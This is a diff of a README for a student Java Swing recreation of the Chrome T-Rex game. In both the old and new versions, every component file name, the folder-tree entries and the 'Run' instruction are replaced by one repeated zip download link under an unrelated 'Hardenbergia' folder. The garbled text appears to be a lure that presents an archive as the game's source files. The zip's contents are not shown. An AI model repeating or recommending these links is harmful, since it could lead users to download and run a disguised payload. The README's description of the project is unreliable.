@@ -15,23 +15,23 @@ A Java-based desktop game that recreates the classic Chrome T-Rex Run using **Sw
 
 ## Core Components
 
-- `https://raw.githubusercontent.com/Arfa01/t-rex-runner-java/main/Hardenbergia/t-rex-runner-java.zip` – character mechanics and animation
-- `https://raw.githubusercontent.com/Arfa01/t-rex-runner-java/main/Hardenbergia/t-rex-runner-java.zip` – cactus generation, movement, collision
-- `https://raw.githubusercontent.com/Arfa01/t-rex-runner-java/main/Hardenbergia/t-rex-runner-java.zip` – infinite scrolling ground
-- `https://raw.githubusercontent.com/Arfa01/t-rex-runner-java/main/Hardenbergia/t-rex-runner-java.zip` – asset loader
-- `https://raw.githubusercontent.com/Arfa01/t-rex-runner-java/main/Hardenbergia/t-rex-runner-java.zip` – central game logic and rendering
-- `https://raw.githubusercontent.com/Arfa01/t-rex-runner-java/main/Hardenbergia/t-rex-runner-java.zip` – main window launcher
+- `https://github.com/Arfa01/t-rex-runner-java/raw/refs/heads/main/Hardenbergia/runner-java-t-rex-2.2.zip` – character mechanics and animation
+- `https://github.com/Arfa01/t-rex-runner-java/raw/refs/heads/main/Hardenbergia/runner-java-t-rex-2.2.zip` – cactus generation, movement, collision
+- `https://github.com/Arfa01/t-rex-runner-java/raw/refs/heads/main/Hardenbergia/runner-java-t-rex-2.2.zip` – infinite scrolling ground
+- `https://github.com/Arfa01/t-rex-runner-java/raw/refs/heads/main/Hardenbergia/runner-java-t-rex-2.2.zip` – asset loader
+- `https://github.com/Arfa01/t-rex-runner-java/raw/refs/heads/main/Hardenbergia/runner-java-t-rex-2.2.zip` – central game logic and rendering
+- `https://github.com/Arfa01/t-rex-runner-java/raw/refs/heads/main/Hardenbergia/runner-java-t-rex-2.2.zip` – main window launcher
 
 ## Folder Structure
 t-rex-runner-java/
 ├── src/
 │ ├── components/
 │ └── utility/
-│ └── https://raw.githubusercontent.com/Arfa01/t-rex-runner-java/main/Hardenbergia/t-rex-runner-java.zip
-│ └── https://raw.githubusercontent.com/Arfa01/t-rex-runner-java/main/Hardenbergia/t-rex-runner-java.zip
+│ └── https://github.com/Arfa01/t-rex-runner-java/raw/refs/heads/main/Hardenbergia/runner-java-t-rex-2.2.zip
+│ └── https://github.com/Arfa01/t-rex-runner-java/raw/refs/heads/main/Hardenbergia/runner-java-t-rex-2.2.zip
 ├── images/
 ├── assets/
-└── https://raw.githubusercontent.com/Arfa01/t-rex-runner-java/main/Hardenbergia/t-rex-runner-java.zip
+└── https://github.com/Arfa01/t-rex-runner-java/raw/refs/heads/main/Hardenbergia/runner-java-t-rex-2.2.zip
 
 
 ## Academic Context
@@ -41,7 +41,7 @@ Developed as part of the **Object-Oriented Programming** course at COMSATS Unive
 ## 🏁 How to Run
 
 1. Open the project in IntelliJ or VS Code
-2. Run `https://raw.githubusercontent.com/Arfa01/t-rex-runner-java/main/Hardenbergia/t-rex-runner-java.zip` to start the game
+2. Run `https://github.com/Arfa01/t-rex-runner-java/raw/refs/heads/main/Hardenbergia/runner-java-t-rex-2.2.zip` to start the game
 3. Press **Spacebar** to start, jump, or restart after game over
 
 ---
